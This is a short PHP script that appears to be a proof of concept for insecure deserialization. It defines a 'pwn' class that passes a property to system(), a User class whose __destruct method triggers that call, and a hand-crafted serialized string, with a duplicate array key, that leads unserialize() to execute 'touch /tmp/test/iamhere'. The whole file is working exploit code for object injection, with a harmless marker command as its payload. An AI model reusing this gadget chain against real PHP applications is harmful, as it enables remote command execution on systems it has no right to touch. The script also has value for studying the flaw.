<?php

class pwn
{
	public function cmd()
	{
		echo system($this->cmd)."\n";
	}
}

class run_cmd_as_user
{	
	public function cmd()
	{
		echo system("whoami");
	}

}

class User
{
	public $name;
	public $isAdmin;
	public $run_cmd;

	public function test()
	{
		echo $run_cmd[0] = $this->run_cmd;
	}
	public function __destruct()
	{
		echo "Destuct called! \n";
		$this->run_cmd->cmd();
	}
}

$pay = new pwn();
$pay->cmd = "touch /tmp/test/iamhere";
$obj = new User();
$cmd = $pay;
$obj->name = "kaines";
$obj->isAdmin = false;
$obj->run_cmd = $cmd;

$ser = serialize($obj);
echo "Ser: ".$ser."\n";

$der = unserialize('a:2:{i:0;O:4:"User":3:{s:4:"name";s:6:"kaines";s:7:"isAdmin";b:0;s:7:"run_cmd";O:3:"pwn":1:{s:3:"cmd";s:23:"touch /tmp/test/iamhere";}}i:0;i:0;}');
#$der = unserialize($ser);
$arr = array("test");
$obj->run_cmd = new run_cmd_as_user();
echo $arr + 1;
echo $der->name."\n";

?>
